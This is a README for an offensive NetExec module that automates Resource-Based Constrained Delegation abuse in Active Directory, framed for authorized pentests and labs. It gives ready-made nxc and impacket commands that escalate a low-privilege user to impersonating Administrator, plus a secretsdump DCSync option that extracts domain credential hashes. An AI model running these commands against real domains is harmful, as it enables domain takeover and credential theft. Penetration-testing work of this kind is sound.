# nxc-modules

Custom modules for [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`).

Drop a file into `~/.nxc/modules/` and `nxc` picks it up automatically:

```bash
cp modules/rbcd.py ~/.nxc/modules/
nxc ldap -L | grep rbcd
```

Tested on nxc `1.5.1` (Yippie-Ki-Yay).

> For authorized penetration testing, labs, and CTFs only.

---

## `rbcd` — Resource-Based Constrained Delegation, end to end

You have a foothold user that can write `msDS-AllowedToActOnBehalfOfOtherIdentity`
on a computer object (BloodHound edge `GenericAll` / `GenericWrite` / `WriteDacl`
/ `AddAllowedToAct` on a computer, very often the DC). This module turns that
edge into a usable Kerberos ticket in one command instead of five.

### What it does

| # | Step | Backed by |
|---|------|-----------|
| 1 | create a machine account (skipped if you pass your own `FROM`) | `impacket-addcomputer` |
| 2 | write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target | `impacket-rbcd -action write` |
| 3 | `S4U2self` + `S4U2proxy`, impersonating `IMPERSONATE` | `impacket-getST` |
| 4 | save the ccache and print the `export KRB5CCNAME=` line | |
| 5 | *(optional)* `secretsdump -just-dc` with that ticket | `impacket-secretsdump` |
| 6 | *(optional)* flush the delegation attribute / delete the computer | `impacket-rbcd`, `impacket-addcomputer` |

LDAP reconnaissance (resolve `dNSHostName` for the SPN, read
`ms-DS-MachineAccountQuota`, show the current delegation list) reuses the
authenticated `nxc` LDAP connection. The privileged operations shell out to the
impacket CLI tools because `impacket.examples` is not importable on Debian/Kali
packages.

### Requirements

- `nxc` with the `ldap` protocol working against the DC
- impacket CLI tools on `PATH` (`impacket-addcomputer`, `impacket-rbcd`, `impacket-getST`, `impacket-secretsdump`)
- the DC FQDN must be **resolvable** (add it to `/etc/hosts`) — `getST` and
  `secretsdump` build the target SPN from it

### Usage

One-shot to a DA-equivalent DCSync (auto-creates a machine account, needs MAQ > 0):

```bash
cd ~/loot                    # the .ccache is written to the current directory
nxc ldap 10.10.10.10 -u lowpriv -H <nthash> \
  -M rbcd -o TARGET=DC01 ACTION=full IMPERSONATE=Administrator DUMP=true CLEANUP=true
```

Just read the current delegation config:

```bash
nxc ldap 10.10.10.10 -u lowpriv -p 'Passw0rd!' -M rbcd -o TARGET=DC01 ACTION=read
```

Bring your own controlled account instead of creating one:

```bash
nxc ldap 10.10.10.10 -u lowpriv -p 'Passw0rd!' \
  -M rbcd -o TARGET=DC01 FROM='EVILPC$' FROM_PASS='Summer2026!' ACTION=full
```

Remove what you added afterwards:

```bash
nxc ldap 10.10.10.10 -u lowpriv -H <nthash> -M rbcd -o TARGET=DC01 ACTION=flush
```

Then use the ticket:

```bash
export KRB5CCNAME=./rbcd_Administrator_DC01.ccache
nxc smb dc01.domain.local --use-kcache
impacket-secretsdump -k -no-pass -just-dc -dc-ip 10.10.10.10 dc01.domain.local
```

### Options

| Option | Default | Meaning |
|--------|---------|---------|
| `TARGET` | host nxc is talking to | computer object to configure delegation **on**; `DC01`, `DC01$` or FQDN |
| `ACTION` | `full` | `full` (write + S4U + ccache), `read`, `write` (no ticket), `flush` |
| `FROM` | *(auto-create)* | sAMAccountName of an attacker-controlled account to delegate **from** |
| `FROM_PASS` / `FROM_HASH` | | credentials for `FROM` when you supply it |
| `COMPUTER` | random `NXC-xxxxxx$` | name of the machine account to create |
| `COMPUTER_PASS` | random | password for the created machine account |
| `IMPERSONATE` | `Administrator` | user to impersonate through S4U |
| `SPN` | `cifs/<TARGET dNSHostName>` | service SPN to request |
| `OUTDIR` | current dir | where to write the `.ccache` |
| `FORWARDABLE` | `false` | pass `-force-forwardable` to `getST` (needed on some hardened DCs) |
| `DUMP` | `false` | run `secretsdump -just-dc` with the resulting ticket |
| `CLEANUP` | `false` | flush the RBCD attribute and try to delete the created computer |
| `METHOD` | `SAMR` | `impacket-addcomputer` method: `SAMR` or `LDAPS` |

### Caveats

- **DNS**: the target FQDN has to resolve locally, or `getST` / `secretsdump`
  fail (often silently). Add it to `/etc/hosts`.
- **Cleanup**: `CLEANUP=true` flushes the delegation attribute reliably, but
  deleting the auto-created machine account usually fails without Domain Admin
  (a MAQ creator gets `CreateChild`, not `Delete`, and self-delete is commonly
  blocked). The module prints the exact `impacket-addcomputer ... -delete`
  command to run once you have DA.
- **Case sensitivity**: a ccache minted by `getST -impersonate` holds only the
  service ticket, and impacket matches the SPN case-sensitively. The module
  keeps the target name consistent; if you script around it, keep the host part
  of the SPN and the `secretsdump` target identical.
- Kerberos is time-sensitive: keep clock skew with the DC under 5 minutes
  (`ntpdate` / `rdate` / `faketime`).

### Verified

End to end against the OffSec Proving Grounds **Resourced** box
(`resourced.local`): a foothold user with `GenericAll` on the DC computer object
-> auto-created machine account -> RBCD write -> S4U as `Administrator` ->
`secretsdump -just-dc` dumped `Administrator` and `krbtgt`.

---

## License

MIT, see [LICENSE](LICENSE).
